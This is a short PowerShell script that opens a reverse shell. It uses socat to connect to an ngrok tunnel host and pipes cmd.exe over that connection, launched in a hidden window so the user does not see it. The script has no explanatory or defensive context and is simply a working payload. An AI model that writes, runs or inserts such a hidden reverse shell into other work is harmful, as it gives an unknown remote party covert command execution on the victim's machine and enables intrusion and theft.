$command = ".\socat.exe tcp-connect:0.tcp.in.ngrok.io:13028  exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden